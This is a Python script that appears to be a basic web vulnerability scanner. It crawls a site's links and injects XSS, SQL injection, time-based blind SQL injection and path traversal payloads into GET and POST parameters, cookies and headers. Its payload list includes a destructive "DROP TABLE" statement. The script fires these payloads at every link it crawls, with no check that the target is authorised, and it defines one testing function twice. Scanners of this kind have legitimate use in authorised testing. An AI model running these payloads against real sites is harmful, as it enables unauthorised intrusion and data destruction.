import requests
import sys
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor
import argparse

payloads = [
    "<script>alert('xss')</script>",
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "' OR '1'='1",  # Always True SQL Injection
    "' OR '1'='0",  # Always False SQL Injection
    "' OR sleep(10)#",  # Time-Based Blind SQL Injection
    "' OR BENCHMARK(5000000,ENCODE('msg', 'by 5 seconds'))#",  # Time-Based Blind SQL Injection
    "../",
    "../../",
    "'; DROP TABLE members; --",
    "AND 1=1"
    # Add more payloads if needed
]

def is_vulnerable_to_sqli(url):
    # SQL payloads that cause a delay 
    sql_test_cases = [
        "' OR SLEEP(10)--", 
        "' OR BENCHMARK(5000000,ENCODE('MSG','by 5 seconds'))--", 
    ]
    
    for payload in sql_test_cases:
        try:
            req_url = url
            # if there are GET parameters in URL
            if "?" in req_url: 
                req_url = req_url.replace("=", "="+payload, 1)
                response = requests.get(req_url, timeout=15)
                if response.elapsed.total_seconds() > 10: 
                    print(f"Possible time-based SQL Injection vulnerability detected, url: {req_url}")
                    return True
        except requests.exceptions.Timeout:
            print(f"Confirmed time-based SQL Injection vulnerability, url: {req_url}")
            return True
        except Exception as e:
            print(f"Error occurred: {str(e)}")
    return False

def test_get_params(url):
    try:
        for payload in payloads:
            if "?" in url:  # it means we have at least one parameter in URL
                # replace first '=' to our payload
                req_url = url.replace("=", "="+payload, 1)
                response = requests.get(req_url)
                if payload in response.text:
                    print(f"GET Parameter vulnerability detected, url: {req_url}, payload: {payload}")
    except:
        print(f"error with {url}")
        pass
# Define function to test GET requests
def test_get_params(url):
    try:
        for payload in payloads:
            if "?" in url:  # it means we have at least one parameter in URL
                # replace first '=' to our payload
                req_url = url.replace("=", "="+payload, 1)
                response = requests.get(req_url)
                if payload in response.text:
                    print(f"GET Parameter vulnerability detected, url: {req_url}, payload: {payload}")
    except:
        print(f"error with {url}")
        pass

# Ensure the URL is in a valid format
def is_valid(url):
    parsed = urlparse(url)
    return bool(parsed.netloc) and bool(parsed.scheme)

def test_post_params(url):
    try:
        for payload in payloads:
            data = {'param': payload}
            response = requests.post(url, data=data)
            if payload in response.text:
                print("*******************")
                print(f"POST Parameter vulnerability detected, url: {url}, payload: {payload}")
                print("*******************")
    except: 
        print(f"error with {url}")
        pass
def test_cookies_headers(url):
    try:
        for payload in payloads:
            cookies = {'cookie': payload}
            headers = {'User-Agent': payload}
            response = requests.get(url, cookies=cookies, headers=headers)
            if payload in response.text:
                print("*******************")
                print(f"Cookie/Header vulnerability detected, url: {url}, payload: {payload}")
                print("*******************")
    except: 
        print(f"error with {url}")
        pass
# Get all URLs within a webpage
def get_all_website_links(url):
    urls = set()
    domain_name = urlparse(url).netloc
    soup = BeautifulSoup(requests.get(url).content, "html.parser")
    for a_tag in soup.findAll("a"):
        href = a_tag.attrs.get("href")
        if href == "" or href is None:
            continue
        href = urljoin(url, href)
        parsed_href = urlparse(href)
        href = parsed_href.scheme+"://"+parsed_href.netloc+parsed_href.path
        if not is_valid(href):
            continue
        urls.add(href)
    return urls
def main():
    # Initial URL
    if len(sys.argv) <= 1: # Adjust this number based on the number of required arguments
        print("Error: You must provide at least one argument.")
        sys.exit()
    #Create arguments necessary for script
    parser = argparse.ArgumentParser(description='Process a URL.')
    parser.add_argument('Initial URL', type=str, help='The URL to process.')
    args = parser.parse_args()
    
    # grab url from argument
    url=sys.argv[1]
    # Crawl and fetch URLs and then run tests on URLs
    for link in get_all_website_links(url):
        print(link)
        is_valid(link)
        test_post_params(link)
        test_cookies_headers(link)
        is_vulnerable_to_sqli(link)
        test_get_params(link)

if __name__ == '__main__':
    main()